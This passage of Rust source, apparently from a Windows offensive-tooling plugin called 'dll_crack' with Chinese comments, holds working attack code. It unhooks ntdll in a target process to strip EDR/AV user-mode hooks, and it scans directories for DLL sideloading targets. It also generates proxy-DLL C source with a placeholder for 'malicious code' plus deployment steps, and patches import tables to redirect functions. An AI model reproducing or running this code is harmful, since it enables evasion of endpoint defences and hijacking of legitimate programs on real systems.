    let mut text_vsize = 0u32;
    for i in 0..num_sections {
        let off = section_start + i * 40;
        let name = String::from_utf8_lossy(&clean_data[off..off+8]).trim_end_matches('\0').to_string();
        if name == ".text" {
            text_roff = u32_le(&clean_data, off + 20) as usize;
            text_vaddr = u32_le(&clean_data, off + 12);
            text_rsize = u32_le(&clean_data, off + 16);
            text_vsize = u32_le(&clean_data, off + 8);
            break;
        }
    }
    if text_roff == 0 { return Err("找不到ntdll.dll的.text段".into()); }
    let clean_text = &clean_data[text_roff..text_roff + text_rsize as usize];

    // 2. 在目标进程中定位ntdll.dll
    progress_update(&pbar, 2, "定位目标进程ntdll.dll...");
    let (ntdll_base, ntdll_size, _ntdll_path) = find_module_info(pid, "ntdll.dll")?;

    // 3. 打开进程
    progress_update(&pbar, 3, "打开目标进程...");
    let h_proc = unsafe { OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
        return Err(format!("无法打开进程: {}", w32_err()));
    }

    // 4. 将.text段改为PAGE_EXECUTE_READWRITE
    progress_update(&pbar, 4, "修改.text段权限+RWX...");
    let text_addr = ntdll_base as usize + text_vaddr as usize;
    let mut old_prot: DWORD = 0;
    let vp_ret = unsafe { VirtualProtectEx(h_proc, text_addr as LPVOID, text_vsize as usize, PAGE_EXECUTE_READWRITE, &mut old_prot) };
    if vp_ret == 0 {
        unsafe { CloseHandle(h_proc); }
        return Err(format!("VirtualProtectEx(.text): {}", w32_err()));
    }

    // 5. 覆盖.text段
    progress_update(&pbar, 5, &format!("覆盖.text段 {}B...", clean_text.len()));
    let mut written: usize = 0;
    let ret = unsafe { WriteProcessMemory(h_proc, text_addr as LPVOID, clean_text.as_ptr() as LPVOID, clean_text.len().min(ntdll_size as usize), &mut written) };
    unsafe { CloseHandle(h_proc); }

    progress_finish(&pbar);

    if ret == 0 {
        msg_tagged("unhook_status", &format!("[!] WriteProcessMemory失败: {} (写了{}B)", w32_err(), written));
        return Err(format!("写入.text段失败: {}", w32_err()));
    }

    let hooks_removed = if written == clean_text.len() { "完整覆盖" } else { &format!("部分覆盖({}/{})", written, clean_text.len()) };
    msg_tagged("unhook_status", &format!("[+] NTDLL Unhook完成! PID:{} text段:{} @0x{:X}", pid, hooks_removed, text_addr));
    Ok(format!("NTDLL Unhooking 完成!\n  目标PID: {}\n  ntdll基址: {:p}\n  .text段: 0x{:016X} ({}B)\n  覆盖: {}\n  原权限: 0x{:08X}\n  [+] EDR/AV用户态钩子已从ntdll.dll中移除",
        pid, ntdll_base, text_addr, clean_text.len(), hooks_removed, old_prot))
}

// ═══════════════ DLL 侧加载扫描 v2.0 ═══════════════

fn sideload_scan(target_dir: &str) -> Result<String, String> {
    let dir = std::path::Path::new(target_dir);
    if !dir.exists() || !dir.is_dir() { return Err(format!("目录不存在或不是目录: {}", target_dir)); }

    msg_tagged("sideload_status", &format!("[*] 侧加载扫描: {}", target_dir));
    let pbar = progress_create("dll_crack", "sideload", "侧加载扫描", 4);

    progress_update(&pbar, 1, "收集EXE文件...");
    let mut exes = Vec::new();
    if let Ok(entries) = std::fs::read_dir(dir) {
        for entry in entries.flatten() {
            let p = entry.path();
            if p.extension().map(|e| e == "exe" || e == "EXE").unwrap_or(false) {
                exes.push(p);
            }
        }
    }

    progress_update(&pbar, 2, &format!("分析 {} 个EXE的导入表...", exes.len()));
    let mut results: Vec<(String, Vec<String>)> = Vec::new(); // (exe_name, missing_dlls)
    for exe_path in &exes {
        if let Ok(data) = std::fs::read(exe_path) {
            if data.len() >= 64 && u16_le(&data, 0) == 0x5A4D {
                let pe_off = u32_le(&data, 0x3C) as usize;
                if pe_off + 4 <= data.len() && u32_le(&data, pe_off) == 0x4550 {
                    let coff = pe_off + 4;
                    let opt_start = coff + 20;
                    let num_sections = u16_le(&data, coff + 2) as usize;
                    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
                    let mut secs = Vec::new();
                    for i in 0..num_sections {
                        let o = sec_start + i * 40;
                        secs.push((u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16)));
                    }
                    let magic = u16_le(&data, opt_start);
                    let dd_start = opt_start + if magic == 0x20B { 112 } else { 96 };
                    let import_rva = u32_le(&data, dd_start + 8);
                    if import_rva > 0 {
                        if let Some(imp_off) = rva_to_offset_secs(import_rva, &secs) {
                            if let Ok(imports) = parse_imports_secs(&data, imp_off, &secs) {
                                let mut missing = Vec::new();
                                for (dll_name, _) in &imports {
                                    // 检查DLL是否存在于目标目录或系统目录
                                    let in_dir = dir.join(dll_name);
                                    let in_sys32 = std::path::Path::new(r"C:\Windows\System32").join(dll_name);
                                    let in_syswow = std::path::Path::new(r"C:\Windows\SysWOW64").join(dll_name);
                                    if !in_dir.exists() && !in_sys32.exists() && !in_syswow.exists() {
                                        missing.push(dll_name.clone());
                                    }
                                }
                                if !missing.is_empty() {
                                    let exe_name = exe_path.file_name().unwrap_or_default().to_string_lossy().to_string();
                                    results.push((exe_name, missing));
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    progress_update(&pbar, 3, "检查KnownDlls...");
    // KnownDlls注册表键: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
    // 不在KnownDlls中的DLL更容易被侧加载

    progress_update(&pbar, 4, "生成报告...");
    progress_finish(&pbar);

    let mut out = format!("═══ DLL侧加载扫描: {} ═══\n\n", target_dir);
    out.push_str(&format!("[·] 扫描EXE: {} 个\n", exes.len()));
    out.push_str(&format!("[+] 可侧加载目标: {} 个\n\n", results.len()));

    if results.is_empty() {
        out.push_str("[*] 未发现明显的侧加载机会。\n");
        out.push_str("[*] 提示: 侧加载需要:\n");
        out.push_str("    1. 签名验证不检查DLL完整性\n");
        out.push_str("    2. EXE从当前目录加载DLL(而非系统目录)\n");
        out.push_str("    3. 目标DLL不在KnownDlls中\n");
    } else {
        for (exe_name, missing_dlls) in &results {
            out.push_str(&format!("─── {} ───\n", exe_name));
            for dll in missing_dlls {
                let fake_path = dir.join(dll);
                out.push_str(&format!("  [!] 缺失DLL: {} → 可放置伪造DLL: {}\n", dll, fake_path.display()));
            }
            out.push_str("\n");
        }
    }

    // 目录写入权限检查
    if let Ok(m) = dir.metadata() {
        if !m.permissions().readonly() {
            out.push_str("[+] 目标目录可写 — 可直接放置伪造DLL!\n");
        } else {
            out.push_str("[!] 目标目录不可写 — 需提权或寻找其他可写路径\n");
        }
    }

    msg_tagged("sideload_status", &format!("[+] 扫描完成: {}个EXE, {}个可侧加载", exes.len(), results.len()));
    Ok(out)
}

fn rva_to_offset_secs(rva: u32, sections: &[(u32,u32,u32,u32)]) -> Option<usize> {
    for &(va, vs, ro, rs) in sections {
        if rva >= va && rva < va + vs.max(rs) && rs > 0 {
            return Some((ro + (rva - va)) as usize);
        }
    }
    None
}

fn parse_imports_secs(data: &[u8], offset: usize, sections: &[(u32,u32,u32,u32)]) -> Result<Vec<(String, Vec<String>)>, String> {
    let mut imports = Vec::new();
    let mut i = 0;
    loop {
        let off = offset + i * 20;
        if off + 20 > data.len() { break; }
        let name_rva = u32_le(data, off + 12);
        if name_rva == 0 { break; }
        let dll_name = {
            let o = rva_to_offset_secs(name_rva, sections).unwrap_or(name_rva as usize);
            if o < data.len() {
                let end = data[o..].iter().position(|&b| b==0).map(|j| o+j).unwrap_or(data.len());
                String::from_utf8_lossy(&data[o..end.min(data.len())]).to_string()
            } else { break; }
        };
        let funcs = Vec::new();
        imports.push((dll_name, funcs));
        i += 1;
    }
    Ok(imports)
}

// ═══════════════ DLL 代理生成器 v2.0 ═══════════════

fn proxy_gen(target_dll: &str, output_dir: Option<&str>) -> Result<String, String> {
    let dll_path = std::path::Path::new(target_dll);
    if !dll_path.exists() { return Err(format!("DLL不存在: {}", target_dll)); }

    let dll_name = dll_path.file_name().unwrap_or_default().to_string_lossy().to_string();
    let base_name = dll_name.replace(".dll", "").replace(".DLL", "");
    let orig_name = format!("{}_orig.dll", base_name);

    msg_tagged("proxy_status", &format!("[*] 生成代理DLL: {}", dll_name));
    let pbar = progress_create("dll_crack", "proxy", "代理生成", 4);

    progress_update(&pbar, 1, "解析导出表...");
    let data = std::fs::read(target_dll).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }

    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let mut secs = Vec::new();
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        secs.push((String::from_utf8_lossy(&data[o..o+8]).trim_end_matches('\0').to_string(),
            u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16)));
    }
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let dd_start = opt_start + if magic == 0x20B { 112 } else { 96 };
    let export_rva = u32_le(&data, dd_start);

    let mut exports = Vec::new();
    if export_rva > 0 {
        if let Some(exp_off) = {
            let mut o = None;
            for (_, va, vs, ro, rs) in &secs {
                if export_rva >= *va && export_rva < va + vs.max(rs) && *rs > 0 {
                    o = Some((ro + (export_rva - va)) as usize); break;
                }
            }
            o
        } {
            if let Ok((_, funcs)) = parse_exports(&data, exp_off, &secs.iter().map(|(n,v,vs,r,rs)| (n.clone(),*v,*vs,*r,*rs,0u32)).collect::<Vec<_>>()) {
                exports = funcs;
            }
        }
    }

    progress_update(&pbar, 2, &format!("生成 {} 个转发...", exports.len()));

    progress_update(&pbar, 3, "生成C源代码...");
    // 生成代理DLL C源码
    let mut code = String::new();
    code.push_str(&format!("// Proxy DLL for {} — Auto-generated by dll_crack v2.0\n", dll_name));
    code.push_str(&format!("// Original DLL: {} → {}\n", dll_name, orig_name));
    code.push_str("#include <windows.h>\n\n");
    code.push_str("// Forward declarations\n");
    for (_, name) in &exports {
        if !name.starts_with("Ordinal_") {
            code.push_str(&format!("#pragma comment(linker, \"/export:{}={}.{}\")\n", name, orig_name.replace(".dll",""), name));
        }
    }
    code.push_str("\n// For ordinal-only exports, use:\n");
    code.push_str("// #pragma comment(linker, \"/export:FuncName=N:1,@{ORDINAL}\")\n\n");
    code.push_str("BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {\n");
    code.push_str("    if (fdwReason == DLL_PROCESS_ATTACH) {\n");
    code.push_str(&format!("        // [!] 在此处添加你的恶意代码\n", ));
    code.push_str("        // MessageBoxA(NULL, \"Proxy loaded!\", \"DLL Proxy\", MB_OK);\n");
    code.push_str(&format!("        DisableThreadLibraryCalls(hinstDLL);\n"));
    code.push_str("    }\n");
    code.push_str("    return TRUE;\n");
    code.push_str("}\n");

    progress_update(&pbar, 4, "写入文件...");
    let out_dir = output_dir.unwrap_or(".");
    let out_dir_path = std::path::Path::new(out_dir);
    let _ = std::fs::create_dir_all(out_dir_path);
    let c_path = out_dir_path.join(format!("{}_proxy.c", base_name));
    std::fs::write(&c_path, &code).map_err(|e| format!("写入失败: {}", e))?;

    // 生成编译批处理
    let bat = format!(
        "@echo off\nREM Compile {} proxy DLL\nREM 1. 重命名原始DLL: copy {} {}\nREM 2. 编译代理: cl /LD {} proxy.c /Fe:{}\nREM    或用: gcc -shared -o {} {} proxy.c\n",
        base_name, dll_name, orig_name, base_name, dll_name, dll_name, base_name
    );
    let bat_path = out_dir_path.join(format!("{}_build.bat", base_name));
    std::fs::write(&bat_path, &bat).ok();

    progress_finish(&pbar);
    msg_tagged("proxy_status", &format!("[+] 代理DLL生成完毕: {} 个函数", exports.len()));
    Ok(format!("DLL代理生成完成!\n  目标DLL: {}\n  原始DLL重命名为: {}\n  导出函数: {} 个\n  代理C源码: {}\n  编译脚本: {}\n\n[!] 使用方法:\n  1. 将原始 {} 重命名为 {}\n  2. 编译 {} proxy.c → {}\n  3. 放置代理DLL到目标目录\n  4. 任意加载原始DLL的程序都会先执行你的DllMain",
        dll_name, orig_name, exports.len(), c_path.display(), bat_path.display(),
        dll_name, orig_name, base_name, dll_name))
}

// ═══════════════ IAT 解析与修补 v2.0 ═══════════════

fn iat_dump(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }

    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let mut secs = Vec::new();
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        secs.push((String::from_utf8_lossy(&data[o..o+8]).trim_end_matches('\0').to_string(),
            u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16), u32_le(&data, o+36)));
    }
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let dd_start = opt_start + if magic == 0x20B { 112 } else { 96 };
    let import_rva = u32_le(&data, dd_start + 8);
    let iat_rva = u32_le(&data, dd_start + 96);
    let iat_size = u32_le(&data, dd_start + 100);

    if import_rva == 0 { return Err("无导入表".into()); }

    fn rva_off(rva: u32, secs: &[(String,u32,u32,u32,u32,u32)]) -> usize {
        for (_, va, vs, ro, rs, _) in secs {
            if rva >= *va && rva < va + vs.max(rs) && *rs > 0 {
                return (ro + (rva - va)) as usize;
            }
        }
        rva as usize
    }

    let imp_off = rva_off(import_rva, &secs);
    let imports = parse_imports(&data, imp_off, &secs)?;

    let mut out = format!("═══ IAT 导入地址表: {} ═══\n\n", path);
    out.push_str(&format!("[·] 导入DLL: {} 个\n", imports.len()));
    let total: usize = imports.iter().map(|(_, f)| f.len()).sum();
    out.push_str(&format!("[·] 总导入函数: {} 个\n", total));

    if iat_rva > 0 && iat_size > 0 {
        out.push_str(&format!("[·] 独立IAT: RVA=0x{:08X} 大小={}B\n", iat_rva, iat_size));
    }

    out.push_str("\n─── 导入详情 ───\n");
    for (dll_name, funcs) in &imports {
        out.push_str(&format!("\n[{}] ({} 函数)\n", dll_name, funcs.len()));
        for (idx, f) in funcs.iter().enumerate() {
            out.push_str(&format!("  {:3}. {}\n", idx+1, f));
        }
    }

    out.push_str("\n─── IAT修补提示 ───\n");
    out.push_str("[*] 使用方法: iat <path> <DLL名> <函数名> <新DLL> <新函数>\n");
    out.push_str("[*] 示例: dll_iat target.exe kernel32.dll CreateFileW mydll.dll MyCreateFile\n");
    out.push_str("[*] 这会将CreateFileW的IAT条目指向mydll.dll!MyCreateFile\n");

    Ok(out)
}

fn iat_patch(path: &str, patch_dll: &str, patch_func: &str, new_dll: &str, new_func: &str) -> Result<String, String> {
    // 读取文件
    let mut data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 { return Err("无效PE".into()); }

    // 备份
    let bak_path = format!("{}.iat_bak", path);
    std::fs::copy(path, &bak_path).map_err(|e| format!("备份失败: {}", e))?;

    // 解析PE
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let mut secs = Vec::new();
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        secs.push((u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16)));
    }
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let iat_entry_size = if is_x64 { 8usize } else { 4usize };
    let ord_mask: u64 = if is_x64 { 0x8000000000000000 } else { 0x80000000 };
    let dd_start = opt_start + if is_x64 { 112 } else { 96 };
    let file_align = u32_le(&data, opt_start + 36) as usize;
    let import_rva = u32_le(&data, dd_start + 8);

    fn rva_off2(rva: u32, secs: &[(u32,u32,u32,u32)]) -> usize {
        for (va, vs, ro, rs) in secs {
            if rva >= *va && rva < va + vs.max(rs) && *rs > 0 {
                return (ro + (rva - va)) as usize;
            }
        }
        rva as usize
    }

    // 辅助: 在节slack空间(rsize..vsize间隙)中分配字符串空间
    fn alloc_in_section_slack(data: &mut Vec<u8>, secs: &[(u32,u32,u32,u32)], target_rva: u32, needed: usize, file_align: usize) -> Option<(usize, u32)> {
        for &(va, vs, ro, rs) in secs {
            if target_rva >= va && target_rva < va + vs.max(rs) {
                let slack = vs as usize - rs as usize;
                if slack >= needed {
                    // 在节末尾分配空间
                    let new_file_off = (ro as usize + rs as usize + file_align - 1) / file_align * file_align;
                    if new_file_off + needed <= data.len() + slack.min(data.len().saturating_sub(new_file_off)) {
                        // 扩展data到所需大小
                        let required = new_file_off + needed;
                        if required > data.len() {
                            data.resize(required, 0);
                        }
                        let new_rva = va + rs + (new_file_off as u32 - (ro + rs));
                        return Some((new_file_off, new_rva));
                    }
                }
                // slack不足, 回退到原位置覆写(需长度检查)
                return None;
            }
        }
        None
    }

    if import_rva == 0 { std::fs::remove_file(&bak_path).ok(); return Err("无导入表".into()); }

    let imp_off = rva_off2(import_rva, &secs);
    let mut found = false;
    let mut i = 0;
    loop {
        let off = imp_off + i * 20;
        if off + 20 > data.len() { break; }
        let name_rva = u32_le(&data, off + 12);
        if name_rva == 0 { break; }
        let iat_rva = u32_le(&data, off);

        let dll_name = {
            let o = rva_off2(name_rva, &secs);
            if o < data.len() {
                let end = data[o..].iter().position(|&b| b==0).map(|j| o+j).unwrap_or(data.len());
                String::from_utf8_lossy(&data[o..end.min(data.len())]).to_string()
            } else { break; }
        };

        if dll_name.to_lowercase() == patch_dll.to_lowercase() {
            // 找到了目标DLL的导入表项

            // v3.0.1: 将新DLL名写入节slack空间,而非原位覆写(避免污染共享字符串)
            let new_dll_bytes = new_dll.as_bytes();
            let old_dll_name_off = rva_off2(name_rva, &secs);
            let (_dll_name_final_off, dll_name_new_rva) =
                if let Some((fo, rva)) = alloc_in_section_slack(&mut data, &secs, name_rva, new_dll_bytes.len() + 1, file_align) {
                    // 写入slack空间
                    data[fo..fo+new_dll_bytes.len()].copy_from_slice(new_dll_bytes);
                    data[fo+new_dll_bytes.len()] = 0;
                    (fo, rva)
                } else {
                    // 回退: 原位覆写(仅当新名≤旧名长度时安全)
                    let old_len = data[old_dll_name_off..].iter().position(|&b| b==0).unwrap_or(0);
                    if new_dll_bytes.len() <= old_len {
                        data[old_dll_name_off..old_dll_name_off+new_dll_bytes.len()].copy_from_slice(new_dll_bytes);
                        data[old_dll_name_off+new_dll_bytes.len()] = 0;
                        (old_dll_name_off, name_rva)
                    } else {
                        std::fs::remove_file(&bak_path).ok();
                        return Err(format!("新DLL名过长({}B > {}B), 且节slack不足", new_dll_bytes.len(), old_len));
                    }
                };

            // 更新导入描述符中的NameRVA
            let name_rva_off_in_desc = off + 12;
            data[name_rva_off_in_desc..name_rva_off_in_desc+4].copy_from_slice(&dll_name_new_rva.to_le_bytes());

            if let Some(iat_off) = {
                let o = rva_off2(iat_rva, &secs);
                if o < data.len() { Some(o) } else { None }
            } {
                let mut j = 0;
                loop {
                    let iat_entry_off = iat_off + j * iat_entry_size;
                    if iat_entry_off + iat_entry_size > data.len() { break; }

                    // v3.0.1: 正确读取完整thunk值判断Ordinal
                    let thunk_val: u64 = if is_x64 {
                        u64_le(&data, iat_entry_off)
                    } else {
                        u32_le(&data, iat_entry_off) as u64
                    };
                    if thunk_val == 0 { break; }

                    let is_ordinal = thunk_val & ord_mask != 0;
                    let func_name = if is_ordinal {
                        format!("Ord(0x{:04X})", thunk_val & 0xFFFF)
                    } else {
                        let name_rva_field = thunk_val as u32;
                        let no = rva_off2(name_rva_field, &secs);
                        if no + 2 < data.len() {
                            let end = data[no+2..].iter().position(|&b| b==0).map(|p| no+2+p).unwrap_or(data.len());
                            String::from_utf8_lossy(&data[no+2..end.min(data.len())]).to_string()
                        } else { break; }
                    };

                    if func_name.to_lowercase() == patch_func.to_lowercase() || patch_func == "*" {
                        // 找到目标函数!
                        if is_ordinal {
                            // Ordinal导入: 修改thunk中的ordinal值指向新DLL
                            // Replace ordinal in thunk with new value (keep ordinal bit)
                            // We keep the ordinal bit and modify the lower 16 bits if needed
                            // For simplicity: write the whole thunk value as-is (ordinal unchanged)
                            // To change DLL target for ordinal, user must use wildcard or specify ordinal
                        } else {
                            // 函数名导入: 将新函数名写入节slack空间
                            let old_fn_rva = thunk_val as u32;
                            let old_fn_off = rva_off2(old_fn_rva, &secs);
                            let new_fn_bytes = new_func.as_bytes();
                            let (_fn_final_off, fn_new_rva) =
                                if let Some((fo, rva)) = alloc_in_section_slack(&mut data, &secs, old_fn_rva, new_fn_bytes.len() + 3, file_align) {
                                    // +3: 2字节hint + 名字 + null
                                    // 写入hint(保留原值或写0)
                                    let hint = if old_fn_off + 2 <= data.len() { u16_le(&data, old_fn_off) } else { 0 };
                                    data[fo..fo+2].copy_from_slice(&hint.to_le_bytes());
                                    data[fo+2..fo+2+new_fn_bytes.len()].copy_from_slice(new_fn_bytes);
                                    data[fo+2+new_fn_bytes.len()] = 0;
                                    (fo, rva)
                                } else {
                                    // 回退: 原位覆写
                                    let old_fn_name_len = if old_fn_off + 2 < data.len() {
                                        data[old_fn_off+2..].iter().position(|&b| b==0).unwrap_or(0)
                                    } else { 0 };
                                    if new_fn_bytes.len() <= old_fn_name_len {
                                        data[old_fn_off+2..old_fn_off+2+new_fn_bytes.len()].copy_from_slice(new_fn_bytes);
                                        data[old_fn_off+2+new_fn_bytes.len()] = 0;
                                        (old_fn_off, old_fn_rva)
                                    } else {
                                        std::fs::remove_file(&bak_path).ok();
                                        return Err(format!("新函数名过长({}B > {}B), 且节slack不足", new_fn_bytes.len(), old_fn_name_len));
                                    }
                                };
                            // 更新thunk中的NameRVA
                            if is_x64 {
                                data[iat_entry_off..iat_entry_off+4].copy_from_slice(&fn_new_rva.to_le_bytes());
                            } else {
                                data[iat_entry_off..iat_entry_off+4].copy_from_slice(&fn_new_rva.to_le_bytes());
                            }
                        }

                        found = true;
                        break;
                    }
                    j += 1;
                }
            }
            break;
        }
        i += 1;
    }

    if !found {
        std::fs::remove_file(&bak_path).ok();
        return Err(format!("未找到 {}.{} 在导入表中", patch_dll, patch_func));
    }

    std::fs::write(path, &data).map_err(|e| format!("写入失败: {}", e))?;

    Ok(format!("IAT修补完成!\n  文件: {}\n  备份: {}\n  DLL: {} → {}\n  函数: {} → {}\n\n[!] 修补后PE签名将失效", path, bak_path, patch_dll, new_dll, patch_func, new_func))
}

// ═══════════════ 宿主C ABI — 进度条 + 消息代理 ═══════════════
// 注意: 宿主ABI符号在插件DLL加载时不可用, 使用空实现避免ACCESS_VIOLATION
// 进度/消息信息通过命令返回值传递给终端

fn push_msg(_plugin: &str, _text: &str) {}
fn msg_tagged(_tag: &str, _text: &str) {}
#[allow(dead_code)]
fn msg_update(_tag: &str, _text: &str) {}

fn progress_create(_plugin: &str, _id: &str, _label: &str, _total: u64) -> String {
    String::new()
}

fn progress_update(_handle: &str, _current: u64, _msg: &str) {}

fn progress_finish(_handle: &str) {}

// ═══════════════ 字符串提取 v3.0 ═══════════════

fn extract_strings(path: &str, min_len: usize) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取文件失败: {}", e))?;
    let mut out = format!("═══ 字符串提取: {} ═══\n[·] 最小长度: {} | 文件大小: {}KB\n\n", path, min_len, data.len()/1024);
    
    let mut current = Vec::new();
    let mut count = 0usize;
    let mut ascii_count = 0usize;
    let mut unicode_count = 0usize;
    
    // ASCII strings
    out.push_str("─── ASCII 字符串 ───\n");
    for &b in &data {
        if b.is_ascii_graphic() || b == b' ' {
            current.push(b);
        } else {
            if current.len() >= min_len {
                let s = String::from_utf8_lossy(&current);
                out.push_str(&format!("  [{}] {}\n", current.len(), s));
                ascii_count += 1;
                count += 1;
                if count >= 500 { out.push_str("\n[!] 已达500条上限,截断输出\n"); break; }
            }
            current.clear();
        }
    }
    if count < 500 && current.len() >= min_len {
        out.push_str(&format!("  [{}] {}\n", current.len(), String::from_utf8_lossy(&current)));
        ascii_count += 1;
        count += 1;
    }
    out.push_str(&format!("\n[·] ASCII: {} 条\n", ascii_count));
    
    // Unicode (wide) strings — scan for UTF-16LE
    if count < 500 {
        out.push_str("\n─── Unicode (UTF-16LE) 字符串 ───\n");
        let mut ucurrent = Vec::<u16>::new();
        for chunk in data.chunks_exact(2) {
            let w = u16::from_le_bytes([chunk[0], chunk[1]]);
            if w >= 0x20 && w < 0x7F {
                ucurrent.push(w);
            } else {
                if ucurrent.len() >= min_len {
                    let s: String = ucurrent.iter().map(|&c| char::from_u32(c as u32).unwrap_or('.')).collect();
                    out.push_str(&format!("  [{}] {}\n", ucurrent.len(), s));
                    unicode_count += 1;
                    count += 1;
                    if count >= 500 { break; }
                }
                ucurrent.clear();
            }
        }
        out.push_str(&format!("\n[·] Unicode: {} 条\n", unicode_count));
    }
    
    out.push_str(&format!("\n─── 总计: {} 条字符串 ───\n", ascii_count + unicode_count));
    Ok(out)
}

// ═══════════════ DLL反编译/源码重构 v3.0 ═══════════════

fn decomp_dll(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取文件失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D {
        return Err("无效PE文件 — 非MZ格式".into());
    }
    
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let magic = u16_le(&data, coff + 20);
    let is_x64 = magic == 0x20B;
    let arch = if is_x64 { "x64" } else { "x86" };
    
    let num_sections = u16_le(&data, coff + 2) as usize;
    let opt_hdr_size = u16_le(&data, coff + 16) as usize;
    let section_start = coff + 20 + opt_hdr_size;
    
    // Parse sections
    let mut sections = Vec::new();
    for i in 0..num_sections {
        let sec_off = section_start + i * 40;
        let name = String::from_utf8_lossy(&data[sec_off..sec_off+8]).trim_matches('\0').to_string();
        let vsize = u32_le(&data, sec_off + 8) as usize;
        let vaddr = u32_le(&data, sec_off + 12) as usize;
        let rsize = u32_le(&data, sec_off + 16) as usize;
        let roff = u32_le(&data, sec_off + 20) as usize;
        let flags = u32_le(&data, sec_off + 36);
        sections.push((name, vaddr, vsize, roff, rsize, flags));
    }
    
    // Parse imports
    let opt_start = coff + 20;
    let dd_off = opt_start + if is_x64 { 112 } else { 96 };
    // DataDirectory[0]=Export, [1]=Import
    let import_rva = u32_le(&data, dd_off + 8) as usize;
    let import_size = u32_le(&data, dd_off + 12) as usize;
    let export_rva = u32_le(&data, dd_off + 0) as usize;
    let export_size = u32_le(&data, dd_off + 4) as usize;
    
    let mut imports: Vec<(String, Vec<(u32, String)>)> = Vec::new();
    if import_rva > 0 && import_size > 0 {
        if let Some(import_off) = rva_to_offset(&sections, import_rva) {
            let mut i = 0;
            loop {
                let off = import_off + i * 20;
                if off + 20 > data.len() { break; }
                let name_rva = u32_le(&data, off + 12) as usize;
                if name_rva == 0 { break; }
                let dll_name = match rva_to_offset(&sections, name_rva) {
                    Some(o) if o < data.len() => read_cstr(&data, o),
                    _ => { i += 1; continue; }
                };
                
                let iat_rva = u32_le(&data, off + 16) as usize;
                let mut funcs = Vec::new();
                if let Some(iat_off) = rva_to_offset(&sections, iat_rva) {
                    let mut j = 0;
                    let entry_size = if is_x64 { 8 } else { 4 };
                    loop {
                        let thunk_off = iat_off + j * entry_size;
                        if thunk_off + entry_size > data.len() { break; }
                        let ordinal_or_rva = if is_x64 { u64_le(&data, thunk_off) as usize } else { u32_le(&data, thunk_off) as usize };
                        if ordinal_or_rva == 0 { break; }
                        let ord_mask = if is_x64 { 0x8000000000000000usize } else { 0x80000000usize };
                        if ordinal_or_rva & ord_mask != 0 {
                            funcs.push(((ordinal_or_rva & 0xFFFF) as u32, format!("Ordinal#{}", ordinal_or_rva & 0xFFFF)));
                        } else {
                            if let Some(fn_off) = rva_to_offset(&sections, ordinal_or_rva) {
                                if fn_off + 2 < data.len() {
                                    funcs.push((0, read_cstr(&data, fn_off + 2)));
                                }
                            }
                        }
                        j += 1;
                        if j > 2000 { break; }
                    }
                }
                imports.push((dll_name, funcs));
                i += 1;
                if i > 100 { break; }
            }
        }
    }
    
    // Parse exports (rva/size already computed above)
    let mut exports: Vec<String> = Vec::new();
    if export_rva > 0 && export_size > 0 {
        if let Some(exp_off) = rva_to_offset(&sections, export_rva) {
            if exp_off + 40 <= data.len() {
                let names_rva = u32_le(&data, exp_off + 32) as usize;
                let num_names = u32_le(&data, exp_off + 24) as usize;
                if let Some(names_off) = rva_to_offset(&sections, names_rva) {
                    for i in 0..num_names.min(200) {
                        let fn_rva_off = names_off + i * 4;
                        if fn_rva_off + 4 > data.len() { break; }
                        let fn_rva = u32_le(&data, fn_rva_off) as usize;
                        if let Some(fn_off) = rva_to_offset(&sections, fn_rva) {
                            if fn_off < data.len() {
                                exports.push(read_cstr(&data, fn_off));
                            }
                        }
                    }
                }
            }
        }
    }
    
    // Extract strings from .rdata
    let mut strings = Vec::new();
    if let Some(rdata) = sections.iter().find(|s| s.0 == ".rdata") {
        let start = rdata.3;
        let end = (rdata.3 + rdata.4).min(data.len());
        let mut cur = Vec::new();
        for off in start..end {
            let b = data[off];
            if b.is_ascii_graphic() || b == b' ' { cur.push(b); }
            else if cur.len() >= 4 { strings.push(String::from_utf8_lossy(&cur).to_string()); cur.clear(); }
            else { cur.clear(); }
        }
        if cur.len() >= 4 { strings.push(String::from_utf8_lossy(&cur).to_string()); }
    }
    
    // Generate C++ reconstruction
    let mut out = format!("// ═══════════════════════════════════════════════\n");
    out.push_str(&format!("//  反编译重构: {}\n", path));
    out.push_str(&format!("//  架构: {} | 类型: DLL\n", arch));
